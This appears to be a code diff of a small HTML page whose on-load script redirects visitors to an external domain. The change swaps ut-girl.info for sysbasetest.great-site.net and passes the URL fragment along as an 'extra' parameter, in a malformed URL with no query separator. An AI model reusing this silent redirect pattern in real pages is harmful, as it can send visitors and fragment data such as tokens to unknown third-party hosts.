@@ -6,10 +6,12 @@
   <script>
     window.onload = function() {
       const hash = window.location.hash.substring(1); // Get the value after #
+      const baseURL = 'https://sysbasetest.great-site.net';
+      
       if (hash) {
-        window.location.replace('http://ut-girl.info/' + hash);
+        window.location.href = baseURL + '&extra=' + hash; // Append hash as extra param
       } else {
-        window.location.replace('http://ut-girl.info'); // Default if no hash is present
+        window.location.href = baseURL;
       }
     };
   </script>
